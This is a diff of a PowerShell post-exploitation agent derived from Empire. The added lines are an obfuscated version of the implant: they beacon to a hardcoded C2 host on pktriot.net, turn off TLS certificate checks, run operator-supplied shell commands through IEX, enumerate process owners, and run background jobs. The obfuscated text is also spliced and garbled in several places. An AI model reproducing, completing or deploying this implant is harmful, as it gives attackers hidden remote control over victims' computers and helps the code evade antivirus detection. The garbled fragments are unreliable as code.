+        while(Bsn{rEnwqmAnwqIniNg}.x6VclnwqEnnwqGthx6Vc -ne 0) {
+            Bsn{DnwqEnwqCoDED} = &(WA8DeWA8+WA8code-PaWA8+WA8ckeWA8+WA8tWA8) Bsn{tAsKInwqNGnwqBYtES} Bsn{ofFsnwqet};
+            Bsn{TynwqPE} = Bsn{dEnwqCoDEd}[0];
+            Bsn{tnwqOtALnwqPaCKETS} = Bsn{deCOnwqdED}[1];
+            Bsn{pACnwqkETnwqNnwqUM} = Bsn{dnwqecnwqODED}[2];
+            Bsn{TnwqASKiD} = Bsn{dnwqEConwqdED}[3];
+            Bsn{LnwqENnwqgth} = Bsn{dnwqenwqCoDed}[4];
+            Bsn{danwqTA} = Bsn{DenwqcnwqODeD}[5];
+            if (Bsn{decnwqOnwqDeD}.x6VcCnwqouNTx6Vc -eq 7) {Bsn{rnwqEnwqmainwqNIng} = Bsn{DecOnwqdnwqed}[6]};
+            Bsn{RnwqESultpACnwqkEnwqTs} += Bsn(&(WA8PWA8+WA8rocess-TaWA8+WA8skingWA8) Bsn{tnwqypE} Bsn{DanwqTa} Bsn{taSKnwqID});
+            Bsn{OnwqFFSeT} += Bsn(12 + Bsn{LennwqGTH});
+        }
+        (& Bsn{snwqenwqNdmessAge} -Packets Bsn{REsUlnwqTnwqpAckenwqTs});
+    }
+    while (Bsn{trnwqUe}) {
+        &(WA8StaWA8+WA8rt-SlWA8+WA8eepWA8) -Seconds 0.666
+        if ( ((Bsn{scrIPTnwq:KnwqInwqLlDATe}) -and ((&(WA8GWA8+WA8et-DWA8+WA8ateWA8)) -gt Bsn{SCrIPnwqTnwq:nwqkiLLdanwqTe})) -or ((!(Bsn{SnwqcriPt:LOnwqstlnwqinwqmnwqIt} -eq 0)) -and (Bsn{SCRipnwqT:mInwqSSenwqdCnwqheCkINS} -gt Bsn{sCrnwqinwqpt:LnwqOStlimIT})) ) {
+            Bsn{pnwqAcKenwqTs} = Bsn{NnwqUlL};(& Bsn{gEnwqTTAnwqsK});
+            ForEach(Bsn{JOnwqBnnwqAmE} in Bsn{snwqCrIPtnwq:jOnwqBS}.x6VcknwqeYSx6Vc) {
+                Bsn{rnwqesUltS} = &(WA8Stop-WA8+WA8AgenWA8+WA8tWA8+WA8JobWA8) -JobName Bsn{JoBnanwqme} jRbz &(WA8flWA8) jRbz &(WA8Out-WA8+WA8StrinWA8+WA8gWA8);
+                Bsn{JOnwqBReSulnwqTID} = Bsn{SnwqcriPT:RnwqEnwqsUlTIDs}[Bsn{jOBnanwqMe}];
+                Bsn{pAnwqCKnwqETs} += Bsn(&(WA8Encode-WA8+WA8PackWA8+WA8etWA8) -type 110 -data Bsn(Bsn{RnwqEsnwqULts}) -ResultID Bsn{JonwqBresnwqUnwqLtid});
+                Bsn{sCrIPnwqT:REnwqsnwqULtnwqiDs}.(WA8RemovWA8+WA8eWA8).Invoke(Bsn{jnwqObName});
+            }
+            if (Bsn{pnwqACknwqets}) {
+                (& Bsn{SnwqeNnwqdmEsnwqsagE} -Packets Bsn{pACnwqKenwqTs});
+            }
+            if ((Bsn{sCnwqRIPTnwq:nwqkinwqlldaTE}) ','e(Bsn{pnwqACknwqet}, 0+Bsn{OnwqFfnwqSET});
+        Bsn{TnwqotaLPacnwqkEtS} = [BitConverter]::(WA8ToWA8+WA8UInt16WA8).Invoke(Bsn{pnwqACKnwqeT}, 2+Bsn{offnwqSnwqET});
+        Bsn{PAnwqCKeTNnwqUM} = [BitConverter]::(WA8ToUIWA8+WA8ntWA8+WA816WA8).Invoke(Bsn{pACnwqkET}, 4+Bsn{onwqFnwqFSet});
+        Bsn{tasknwqid} = [BitConverter]::(WA8ToWA8+WA8UInt16WA8).Invoke(Bsn{PaCnwqKET}, 6+Bsn{OfnwqFSET});
+        Bsn{LnwqEnwqNGTH} = [BitConverter]::(WA8TWA8+WA8oUInt32WA8).Invoke(Bsn{PAnwqcnwqKET}, 8+Bsn{oFFsnwqeT});
+        Bsn{DnwqAta} = [System.Text.Encoding]::x6VcUnwqTF8x6Vc.x6VcgnwqetsnwqTRinwqNGx6Vc(Bsn{PnwqAcknwqet}[(12+Bsn{onwqFFSnwqet})..(12+Bsn{LnwqeNnwqgTH}+Bsn{OFfnwqSnwqet}-1)]);
+        Bsn{rnwqeMAInnwqIng} = [System.Text.Encoding]::x6VcutnwqF8x6Vc.x6VcgnwqeTnwqsTrInGx6Vc(Bsn{pnwqAcKnwqEt}[(12+Bsn{LeNgnwqTH}+Bsn{OFfsnwqET})..(Bsn{paCnwqknwqet}.x6VcLnwqENnwqGtHx6Vc)]);
+        &(WA8RemovWA8+WA8eWA8+WA8-WA8+WA8VariaWA8+WA8bleWA8) (WA8packWA8+WA8etWA8);
+        &(WA8StWA8+WA8aWA8+WA8rt-SleeWA8+WA8pWA8) -Seconds 1.5
+        @(Bsn{tnwqyPE}, Bsn{ToTanwqlnwqPacKetS}, Bsn{PAnwqcnwqketNUm}, Bsn{TanwqsKnwqiD}, Bsn{LeNnwqgTh}, Bsn{dnwqATA}, Bsn{remanwqinwqNnwqING});
+    }
+    function PnwqROCenwqSSnwq-nwqTaskINg {
+       
+        param(Bsn{TYnwqpe}, Bsn{MnwqsG}, Bsn{RnwqenwqsulTnwqiD})
         try {
-            $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
-        }
-        catch {
-            $AES=New-Object System.Security.Cryptography.RijndaelManaged;
-        }
-        $AES.Mode = "CBC";
-        $AES.Key = $Encoding.GetBytes($SessionKey);
-        $AES.IV = $IV;
-        $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
-        $HMAC.Key = $Encoding.GetBytes($SessionKey);
-        $ciphertext + $hmac.ComputeHash($ciphertext)[0..9];
-    }
-    function Decrypt-Bytes {
-        param ($inBytes)
-        if($inBytes.Length -gt 32) {
-            $mac = $inBytes[-10..-1];
-            $inBytes = $inBytes[0..($inBytes.length - 11)];
-            $hmac.Key = $Encoding.GetBytes($SessionKey);
-            $expected = $hmac.ComputeHash($inBytes)[0..9];
-            if (@(Compare-Object $mac $expected -sync 0).Length -ne 0) {
-                return;
+            if(Bsn{tnwqYpe} -eq 1) {
+                return &(WA8EWA8+WA8ncoWA8+WA8dWA8+WA8e-PacketWA8) -type Bsn{TYnwqPe} -data Bsn(&(WA8GWA8+WA8et-SyWA8+WA8siWA8+WA8nfoWA8)) -ResultID Bsn{reSulnwqTiD};
             }
-            $IV = $inBytes[0..15];
-            try {
-                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
-            }
-            catch {
-                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
-            }
-            $AES.Mode = "CBC";
-            $AES.Key = $Encoding.GetBytes($SessionKey);
-            $AES.IV = $IV;
-            ($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
-        }
-    }
-    function New-RoutingPacket {
-        param($EncData, $Meta)
-        if($EncData) {
-            $EncDataLen = $EncData.Length;
-        }
-        else {
-            $EncDataLen = 0;
-        }
-        $SKB = $Encoding.GetBytes($StagingKey);
-        $IV=[BitConverter]::GetBytes($(Get-Random));
-        $Data = $Encoding.GetBytes($script:SessionID) + @(0x01,$Meta,0x00,0x00) + [BitConverter]::GetBytes($EncDataLen);
-        $RoutingPacketData = ConvertTo-Rc4ByteStream -In $Data -RCK $($IV+$SKB);
-        if($EncData) {
-            ($IV + $RoutingPacketData + $EncData);
-        }
-        else {
-            ($IV + $RoutingPacketData);
-        }
-    }
-    function Decode-RoutingPacket {
-        param($PacketData)
-        if ($PacketData.Length -ge 20) {
-            $Offset = 0;
-            while($Offset -lt $PacketData.Length) {
-                $RoutingPacket = $PacketData[($Offset+0)..($Offset+19)];
-                $RoutingIV = $RoutingPacket[0..3];
-                $RoutingEncData = $RoutingPacket[4..19];
-                $Offset += 20;
-                $SKB = $Encoding.GetBytes($StagingKey);
-                $RoutingData = ConvertTo-Rc4ByteStream -In $RoutingEncData -RCK $($RoutingIV+$SKB);
-                $PacketSessionID = [System.Text.Encoding]::UTF8.GetString($RoutingData[0..7]);
-                $Language = $RoutingData[8];
-                $Meta = $RoutingData[9];
-                $Extra = $RoutingData[10..11];
-                $PacketLength = [BitConverter]::ToUInt32($RoutingData, 12);
-                if ($PacketLength -lt 0) {
-                    break;
-                }
-                if ($PacketSessionID -eq $script:SessionID) {
-                    $EncData = $PacketData[$Offset..($Offset+$PacketLength-1)];
-                    $Offset += $PacketLength;
-                    Process-TaskingPackets $EncData;
+            elseif(Bsn{tYnwqPE} -eq 2) {
+                Bsn{mnwqsG} = (WA8[!]WA8+WA8 WA8+WA8Agent WA8)+Bsn{snwqCrnwqiPt:SnwqEnwqssIONId}+(WA8 WA8+WA8exitingWA8);
+                (& Bsn{SendnwqMEnwqSSnwqAgE} -Packets Bsn(&(WA8EncWA8+WA8odWA8+WA8e','Et}+Bsn{paCnwqkeTLEnwqNnwqgtH}-1)];
+                    Bsn{OfFsnwqet} += Bsn{pnwqAnwqcnwqkEtLEnwqNGth};
+                    &(WA8Process-WA8+WA8TasWA8+WA8kWA8+WA8ingPaWA8+WA8cketsWA8) Bsn{enCnwqDnwqATA};
                 }
                 else {
                 }
@@ -590,401 +147,865 @@ function Invoke-Empire {
         else {
         }
     }
-    function Encode-Packet {
-        param([Int16]$type, $data, [Int16]$ResultID=0)
-        if ($data -is [System.Array]) {
-            $data = $data -join "`n";
-        }
-        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data));
-        $packet = New-Object Byte[] (12 + $data.Length);
-        ([BitConverter]::GetBytes($type)).CopyTo($packet, 0);
-        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 2);
-        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 4);
-        ([BitConverter]::GetBytes($ResultID)).CopyTo($packet, 6);
-        ([BitConverter]::GetBytes($data.Length)).CopyTo($packet, 8);
-        ([System.Text.Encoding]::UTF8.GetBytes($data)).CopyTo($packet, 12);
-        $packet;
-    }
-    function Decode-Packet {
-        param($packet, $offset=0)
-        $Type = [BitConverter]::ToUInt16($packet, 0+$offset);
-        $TotalPackets = [BitConverter]::ToUInt16($packet, 2+$offset);
-        $PacketNum = [BitConverter]::ToUInt16($packet, 4+$offset);
-        $TaskID = [BitConverter]::ToUInt16($packet, 6+$offset);
-        $Length = [BitConverter]::ToUInt32($packet, 8+$offset);
-        $Data = [System.Text.Encoding]::UTF8.GetString($packet[(12+$offset)..(12+$Length+$offset-1)]);
-        $Remaining = [System.Text.Encoding]::UTF8.GetString($packet[(12+$Length+$offset)..($packet.Length)]);
-        Remove-Variable packet;
-        @($Type, $TotalPackets, $PacketNum, $TaskID, $Length, $Data, $Remaining);
-    }
-    function Process-Tasking {
-        param($type, $msg, $ResultID)
-        try {
-            if($type -eq 1) {
-                return Encode-Packet -type $type -data $(Get-Sysinfo) -ResultID $ResultID;
+    function EnwqNcODe-PnwqAcket {
+        param([Int16]Bsn{TnwqYPE}, Bsn{DnwqATa}, [Int16]Bsn{RnwqenwqSnwqULTId}=0)
+   ','PT} = &(WA8EWA8+WA8ncrypt-ByteWA8+WA8sWA8) Bsn{enCOdnwqInwqNg}.(WA8GeWA8+WA8tWA8+WA8BytesWA8).Invoke(Bsn{dnwqAta});
+                &(WA8EncWA8+WA8odWA8+WA8e-PackeWA8+WA8tWA8) -type Bsn{tynwqPE} -data (WA8sWA8+WA8cWA8+WA8rWA8+WA8ipt sucWA8+WA8cessWA8+WA8fWA8+WA8ully saved WA8+WA8in memWA8+WA8oWA8+WA8ryWA8) -ResultID Bsn{rESnwqUlnwqTId};
             }
-            elseif($type -eq 2) {
-                $msg = "[!] Agent "+$script:SessionID+" exiting";
-                (& $SendMessage -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID));
-                exit;
-            }
-            elseif($type -eq 34) {
-                Encode-Packet -type 0 -data '[!] Proxy chain not implemented' -ResultID $ResultID;
-            }
-            elseif($type -eq 40) {
-                $parts = $data.Split(" ");
-                if($parts.Length -eq 1) {
-                    $cmd = $parts[0];
-                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join "`n").trim() -ResultID $ResultID;
+            elseif(Bsn{tYnwqpe} -eq 121) {
+                Bsn{scrnwqInwqpt} = &(WA8DWA8+WA8eWA8+WA8cryptWA8+WA8-BytWA8+WA8esWA8) Bsn{snwqCRnwqIpnwqT:InwqmPOnwqRteDnwqSCripT};
+                if (Bsn{scnwqRIpT}) {
+                    Bsn{JnwqOnwqBiD} = &(WA8StaWA8+WA8rtWA8+WA8-AgentJoWA8+WA8bWA8) ([System.Text.Encoding]::x6VcuTnwqF8x6Vc.x6VcGEtnwqstnwqRiNgx6Vc(Bsn{scnwqRipT}) + (WA8; WA8+x6VcBsndatax6Vc));
+                    Bsn{SCnwqRiPnwqT:rESnwqUlnwqTidS}[Bsn{JnwqOBiD}]=Bsn{resnwqUnwqltiD};
+                    &(WA8Encode-WA8+WA8PWA8+WA8acketWA8) -type Bsn{tnwqype} -data ((WA8JWA8+WA8ob sWA8+WA8tartedWA8+WA8:WA8+WA8 WA8) + Bsn{JoBnwqID}) -ResultID Bsn{reSnwqULtnwqID};
                 }
-                else{
-                    $cmd = $parts[0];
-                    $cmdargs = $parts[1..$parts.length] -join " ";
-                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim() -ResultID $ResultID;
+   ','JlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMzWA8+WA85UaGUgcmVzb3VyWA8+WA8Y2UgeW9WA8+WA81IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtbWA8+WA83ZlZCwgaGFkIGl0cyBuYW1lIGWA8+WA8NoYWWA8+WA85nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgICAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg==WA8)
+    )
+    Bsn{ENcnwqOdnwqINg} = [System.Text.Encoding]::x6VcAsCnwqiix6Vc;
+    Bsn{HnwqMac} = &(WA8NWA8+WA8ewWA8+WA8-ObjectWA8) (WA8SysWA8+WA8tem.SWA8+WA8ecurWA8+WA8ityWA8+WA8.CryWA8+WA8ptWA8+WA8ographWA8+WA8yWA8+WA8.HMWA8+WA8ACSWA8+WA8HA2WA8+WA856WA8);
+    Bsn{scRiPtnwq:aGnwqenwqNTnwqDEnwqLaY} = Bsn{AnwqGenwqNtDnwqeLaY};
+    Bsn{scnwqRiPt:agnwqEnwqNtjnwqItnwqTER} = Bsn{AGentnwqJInwqTter};
+    Bsn{Script:nwqlnwqostnwqLIMIT} = Bsn{LonwqSnwqTlimnwqIT};
+    Bsn{snwqCrIpt:nwqmiSsenwqdCheCkinwqNS} = 0;
+    Bsn{sCRnwqIPt:RnwqEsnwqUnwqLTidS} = @{};
+    Bsn{SCrIpT:nwqWoRknwqinwqNgHOUnwqRS} = Bsn{WOnwqRkinwqNnwqghoURS};
+    Bsn{SCnwqRIPnwqT:dEFanwqUlnwqTnwqRnwqesPOnnwqse} = [System.Text.Encoding]::x6VcAnwqsciIx6Vc.x6VcgnwqETsnwqTnwqRinGx6Vc([System.Convert]::(WA8FWA8+WA8romBase64WA8+WA8StWA8+WA8rinWA8+WA8gWA8).Invoke(Bsn{DenwqFanwqUnwqLnwqTReSPoNSe}));
+    Bsn{SCripnwqT:nwqPrnwqOXY} = Bsn{pnwqRoxysEtTnwqinnwqgs};
+    Bsn{SCRIPtnwq:cUnwqRRnwqeNnwqTlisnwqTENnwqenwqRnwqNaME} = x6Vcx6Vc;
+    Bsn{SCnwqRIpnwqT:sErveRInwqNDeX} = 0;
+    Bsn{scrIpt:COnwqNtrnwqolSErvnwqeRs} = Bsn{snwqeRVEnwqRS};
+    Bsn{rEtRinwqEs} = 1;
+    if(Bsn{kInwqlLnwqDayS}) {
+        Bsn{ScRnwqInwqpT:killDnwqAtE} = (&(WA8GeWA8+WA8tWA8+WA8-DateWA8)).(WA8AddDaWA8+WA8ysWA8).Invoke(Bsn{kiLLdnwqAys}).(WA8ToWA8+WA8StrWA8+WA8ingWA8).Invoke((WA8MM/dWA8+WA8dWA8+WA8/yyyyWA8))
+    }
+    if(Bsn{KinwqLnwqLdaTe} -ne (WA8REWA8+WA8PLACE_WA8+WA8KWA8+WA8ILLDATEWA8) -and Bsn{KnwqillnwqdatE} -ne Bsn{NUnwqlL}) {
+        Bsn{sCRnwqinwqPT:nwqKillDATE} = Bsn{knwqillnwqDaTE}
+    }
+    Bsn{pnwqRoFInwqLEPnwqARTs} = Bsn{PRnwqofnwqIle}.(WA8spliWA8+WA8tWA8).Invoke(WA8jRbzWA8);
+    Bsn{snwqCript:nwqTAskUrIS} = Bsn{PronwqFiLenwqPaRTS}[0].(WA8splWA8+WA8itWA8).Invoke(WA8,WA8);
+    Bsn{sCrinwqpnwqT:unwqsernwqAnwqgEnT} = Bsn{pronwqFiLnwqEnwqPnwqARtS}[1];',' x6Vc,x6Vc);
+                        Bsn{onwqUT} jRbz &(WA8AWA8+WA8dd-WA8+WA8MemberWA8) (WA8NoteprWA8+WA8opWA8+WA8eWA8+WA8rtyWA8) (WA8DWA8+WA8NSServerWA8) Bsn(Bsn{_}.x6VcDnwqNSnwqsnwqeRVErSeaRCHnwqOrdnwqErx6Vc -join x6Vc,x6Vc);
+                        Bsn{OnwqUT} jRbz &(WA8AdWA8+WA8d-WA8+WA8MemberWA8) (WA8NotepropWA8+WA8ertWA8+WA8yWA8) (WA8DNSWA8+WA8HosWA8+WA8tWA8+WA8NameWA8) Bsn{_}.x6VcDNShosnwqTNnwqAMex6Vc;
+                        Bsn{onwqUT} jRbz &(WA8AdWA8+WA8d-MWA8+WA8emberWA8) (WA8NWA8+WA8otepWA8+WA8ropeWA8+WA8rtyWA8) (WA8DNSSuWA8+WA8ffWA8+WA8ixWA8) Bsn(Bsn{_}.x6VcDnsDoMAnwqinwqNsUnwqFfixsenwqAnwqRnwqCHnwqorDERx6Vc -join x6Vc,x6Vc);
+                        Bsn{OnwqUT}
+                    } jRbz &(WA8CoWA8+WA8nverWA8+WA8tTo-WA8+WA8JsonWA8);
                 }
-            }
-            elseif($type -eq 41) {
-                try {
-                    $ChunkSize = 512KB;
-                    $Parts = $Data.Split(" ");
-                    if($Parts.Length -gt 1) {
-                        $Path = $Parts[0..($parts.length-2)] -join " ";
+                ((WA8(pWA8+WA8sbOlWA8+WA8taskliWA8+WA8st)WA8).x6VcrePLAnwqCex6Vc(WA8bOlWA8,[string][CHAR]124)) {
+                    Bsn{onwqWNnwqErS} = @{};
+                    &(WA8GetWA8+WA8-WmWA8+WA8iOWA8+WA8bjectWA8) (WA8wWA8+WA8in32WA8+WA8_proWA8+WA8cessWA8) jRbz &(WA8ForEach-WA8+WA8ObjecWA8+WA8tWA8) {
                         try {
-                            $ChunkSize = $Parts[-1]/1;
-                            if($Parts[-1] -notlike "*b*") {
-                                $ChunkSize = $ChunkSize * 1024;
-                            }
+                            Bsn{O} = Bsn{_}.(WA8getoWA8+WA8wnWA8+WA8erWA8).Invoke()
+                            if (-not Bsn(Bsn{o}.x6VcunwqSeRx6Vc)) {
+                                Bsn{O} = (WA8N/WA8+WA8AWA8)
+                            } else {
+                                Bsn{O} = x6VcBsn(Bsno.Domain)214MBsn(Bsno.User)x6Vc
+                            }','
+    Bsn{scrIpTnwq:snwqEsSnwqIoNnwqid} = Bsn{snwqeSSIONnwqiD};
+    Bsn{sCRipt:nwqHnwqEAnwqDnwqERS} = @{};
+    if(Bsn{PrnwqOnwqFIlenwqpnwqARts}[2]) {
+        Bsn{PnwqRonwqFilnwqepnwqArTs}[2..Bsn{pRonwqFilenwqpAnwqRtS}.x6VclnwqEngThx6Vc] jRbz &(WA8FWA8+WA8orEach-OWA8+WA8bjeWA8+WA8ctWA8) {
+            Bsn{PanwqRTs} = Bsn{_}.(WA8SpliWA8+WA8tWA8).Invoke(WA8:WA8);
+            Bsn{ScrnwqIpnwqT:HeADnwqErs}.x6VcanwqdDx6Vc(Bsn{pAnwqRtS}[0],Bsn{ParnwqTs}[1]);
+        }
+    }
+    Bsn{sCrIPt:nwqJnwqObS} = @{};
+    Bsn{SnwqCRipT:DoWnwqNnwqlOAdS} = @{};
+    Bsn{SCrnwqipnwqT:nwqimPonwqRTEDscnwqRInwqPT} = WA8WA8;
+    function coNnwqVerttnwqOnwq-RCnwq4BYTnwqesTrEnwqAM {
+        Param (Bsn{InwqN}, Bsn{rnwqck})
+        begin {
+            [Byte[]] Bsn{s} = 0..255;
+            Bsn{J} = 0;
+            0..255 jRbz &(WA8ForEachWA8+WA8-ObWA8+WA8jeWA8+WA8ctWA8) {
+                Bsn{j} = (Bsn{J} + Bsn{s}[Bsn{_}] + Bsn{RnwqcK}[Bsn{_} % Bsn{rnwqck}.x6VclnwqeNnwqgTHx6Vc]) % 256;
+                Bsn{S}[Bsn{_}], Bsn{s}[Bsn{j}] = Bsn{S}[Bsn{J}], Bsn{s}[Bsn{_}];
+            };
+            Bsn{I} = Bsn{j} = 0;
+        }
+        process {
+            ForEach(Bsn{BynwqTe} in Bsn{InwqN}) {
+                Bsn{I} = (Bsn{i} + 1) % 256;
+                Bsn{j} = (Bsn{J} + Bsn{S}[Bsn{I}]) % 256;
+                Bsn{s}[Bsn{i}], Bsn{S}[Bsn{j}] = Bsn{s}[Bsn{j}], Bsn{S}[Bsn{I}];
+                Bsn{BnwqyTE} -bxor Bsn{S}[(Bsn{s}[Bsn{i}] + Bsn{s}[Bsn{j}]) % 256];
+            }
+        }
+    }
+    function Get-hEnwqXSnwqTrIng {
+        param([byte]Bsn{DanwqTA})
+        (Bsn{DAnwqTA} jRbz &(WA8FoWA8+WA8rEaWA8+WA8cWA8+WA8hWA8+WA8-ObjectWA8) { x6Vc{0:X2}x6Vc -f Bsn{_} }) -join WA8 WA8;
+    }
+    function SEnwqT-DnwqElAY {
+        param([int]Bsn{D}, [double]Bsn{J}=0.0)
+        Bsn{sCrnwqipnwqTnwq:nwqAgEntDElAY} = Bsn{d};
+        Bsn{scRnwqInwqpTnwq:AnwqgeNTjitnwqTER} = Bsn{J};
+        (WA8agWA8+WA8ent WA8+WA8iWA8+WA8ntervalWA8+WA8 WA8+WA8seWA8+WA8t WA8+WA8tWA8+WA8o WA8+x6VcBsnscript:AgentDelay x6Vc+WA8sWA8+WA8econdWA8+WA8s WA8+WA8witWA8+WA8h WA8+WA8a WA8+WA8jitWA8+WA8ter WA8+WA8ofWA8+WA8 WA8+x6VcBsnscript:AgentJitterx6Vc);
+    }
+    function GEnwqTnwq-DelnwqAy {
+        (WA8agenWA8+WA8t WA8+WA8inWA8+WA8tervalWA8+WA8 WA8+WA8delWA8+WA8ay WA8+WA8iWA8+WA8nterval:WA8+WA8 WA8+x6VcBsnscript:AgentDelay x6Vc+WA8seconWA8+WA8ds WA8+WA8witWA8+WA8h WA8+WA8a WA8+WA8jitWA8+WA8ter WA8+WA8ofWA8+WA8 WA8+x6VcBsnscript:AgentJitterx6Vc);
+    }
+    function set-LOSnwqTLnwqIMIt {
+        param([int]Bsn{L})
+        Bsn{snwqcrInwqpnwqT:lostLiMnwqiT} = Bsn{l};
+        if(Bsn{L} -eq 0)
+        {
+            (WA8agent set to neWA8+WA8veWA8+WA8rWA8+WA8 dieWA8+WA8 baWA8+WA8sed on chWA8+WA8eWA8+WA8ckin LWA8+WA8imitWA8);
+        }
+        else
+','WA8t-AWA8+WA8clWA8) Bsn{_}.x6VcFunwqLLNAmex6Vc).x6VcoWnwqNErx6Vc }},@{(WA8NaWA8+WA8meWA8)=(WA8LaWA8+WA8stWA8+WA8WritWA8+WA8eTimeWA8);(WA8ExWA8+WA8prWA8+WA8essionWA8)={(Bsn{_}.x6VcLnwqAnwqSTwnwqRITETiMEx6Vc.(WA8ToStWA8+WA8rWA8+WA8ingWA8).Invoke(x6Vcux6Vc))}},(WA8lenWA8+WA8gthWA8),(WA8naWA8+WA8meWA8) jRbz &(WA8ConvWA8+WA8erWA8+WA8tToWA8+WA8-JsonWA8);
                         }
-                        catch {
-                            $Path += " $($Parts[-1])";
+                        catch [System.Management.Automation.ActionPreferenceStopException] {
+                            Bsn{oUTnwqpnwqUT} = (WA8[!]WA8+WA8 WA8+WA8EWA8+WA8rWA8+WA8ror: WA8+x6VcBsn_ x6Vc+WA8(orWA8+WA8 WA8+WA8cWA8+WA8annWA8+WA8ot WA8+WA8beWA8+WA8 WA8+WA8acceWA8+WA8sWA8+WA8sed).WA8);
                         }
                     }
-                    else {
-                        $Path = $Data;
+                }
+                ((WA8(mvyWA8+WA8SHmWA8+WA8ovWA8+WA8eyWA8+WA8SHcWA8+WA8opyyWA8+WA8SHcpySHrmySWA8+WA8HdeWA8+WA8lWA8+WA8ySHrWA8+WA8mdWA8+WA8irWA8+WA8yWA8+WA8SHmkdWA8+WA8ir)WA8)-cREPlaCEWA8ySHWA8,[cHAR]124) {
+                    if (Bsn{CnwqmDAnwqRgS}.x6VcLEnwqNGTHx6Vc -ne x6Vcx6Vc) {
+                        try {
+                            &(WA8IWA8+WA8EXWA8) (x6VcBsncmd x6Vc+x6VcBsncmdargs x6Vc+WA8-FWA8+WA8orce WA8+WA8-ErrorWA8+WA8ActionWA8+','oSWA8+WA8tringWA8).Invoke();
                     }
-                    $Path = $Path.Trim('"').Trim("'");
-                    if($ChunkSize -lt 512KB) {
-                        $ChunkSize = 512KB;
+                    &(WA8EncodWA8+WA8eWA8+WA8-WA8+WA8PackeWA8+WA8tWA8) -data Bsn{REnwqSnwqULTS} -type 40 -ResultID Bsn{renwqsUlTnwqID};
+                }
+                catch {
+                    &(WA8EncWA8+WA8odWA8+WA8e-PacWA8+WA8ketWA8) -type 0 -data (WA8[!]WA8+WA8 EWA8+WA8rror whiWA8+WA8le execuWA8+WA8tinWA8+WA8g WA8+WA8assemblyWA8) -ResultID Bsn{rnwqeSunwqLTiD};
+                }
+            }
+            elseif(Bsn{TYnwqPe} -eq 50) {
+                Bsn{dOnwqwnlnwqoADs} = Bsn{sCRInwqpt:nwqJOnwqBS}.x6VcKenwqysx6Vc -join x6Vcnwqnx6Vc;
+                &(WA8EnWA8+WA8coWA8+WA8dWA8+WA8e-PWA8+WA8acketWA8) -data ((WA8RuWA8+WA8nningWA8+WA8 WA8+x6VcJobs:nwqnBsnDownloadsx6Vc)) -type Bsn{TnwqYPE} -ResultID Bsn{rESunwqltnwqID};
+            }
+            elseif(Bsn{TYnwqPe} -eq 51) {
+                Bsn{jonwqBNnwqAMe} = Bsn{DnwqAtA};
+                Bsn{JnwqOBREnwqSuLTnwqid} = Bsn{rESUnwqltnwqidS}[','Bsn{SnwqcrInwqPT:sERVEr} = (WA8htWA8+WA8tp:/WA8+WA8/WA8+WA8bravWA8+WA8e-WA8+WA8dust-49WA8+WA8022WA8+WA8.pktrWA8+WA8ioWA8+WA8tWA8+WA8.netWA8+WA8:WA8+WA822161WA8);
+Bsn{ScripT:nwqconTRnwqOLnwqSnwqenwqRVERS} = @(Bsn{ScrinwqPT:sEnwqRvnwqER});
+Bsn{ScRnwqIptnwq:nwqSnwqERVernwqiNDex} = 0;
+if(Bsn{SnwqenwqRvEr}.(WA8StWA8+WA8artWA8+WA8sWithWA8).Invoke((WA8httWA8+WA8psWA8))){
+    [System.Net.ServicePointManager]::x6VcsnwqeRvnwqEnwqRCErTificnwqAtevnwqALIdAnwqTioNcaLLbnwqAnwqCkx6Vc = {Bsn{TRnwqUe}};
+}
+
+Bsn{ScnwqRnwqiPT:nwqSnwqeNdmEnwqSsAgE} = {
+    param(Bsn{PanwqCnwqKEts})
+
+    if(Bsn{PacKEnwqTS}) {
+
+        Bsn{EnnwqcBYnwqTnwqeS} = &(WA8EncryWA8+WA8pt-WA8+WA8BWA8+WA8ytesWA8) Bsn{pnwqACKETS};
+
+
+
+        Bsn{ROutnwqInwqNGpaCnwqknwqEt} = &(WA8NeWA8+WA8w-WA8+WA8RoutingPWA8+WA8acketWA8) -EncData Bsn{ENcnwqBnwqynwqTes} -Meta 5;
+
+        if(Bsn{sCriptnwq:nwqconnwqTROLsnwqErveRS}[Bsn{sCRIpT:snwqenwqRnwqVeRnwqinnwqDex}].(WA8SWA8+WA8tarWA8+WA8tsWA8+WA8WithWA8).Invoke((WA8htWA8+WA8tpWA8))) {
+
+            Bsn{wnwqC} = &(WA8NWA8+WA8ew-ObWA8+WA8jecWA8+WA8tWA8) (WA8SysWA8+WA8tWA8+WA8em.Net.WebWA8+WA8ClienWA8+WA8tWA8);
+
+            Bsn{wC}.x6VcprnwqOXYx6Vc = [System.Net.WebRequest]::(WA8GetWA8+WA8SysWA8+WA8tWA8+WA8emWebProxyWA8).Invoke();
+            Bsn{Wc}.x6VcPronwqxyx6Vc.x6VcCnwqREnwqDentIAnwqLsx6Vc = [System.Net.CredentialCache]::x6VcdefAnwqULtCRnwqenwqdEntIalSx6Vc;
+            if(Bsn{ScrInwqpnwqT:PROxY}) {
+                Bsn{Wnwqc}.x6VcPronwqxyx6Vc = Bsn{SCRinwqpt:nwqPnwqRoxY};
+            }
+
+            Bsn{Wc}.x6VchnwqeAdErsx6Vc.(WA8AdWA8+WA8dWA8).Invoke((WA8UsWA8+WA8erWA8+WA8-AgentWA8), Bsn{snwqCripTnwq:USEnwqRAgenwqNt});
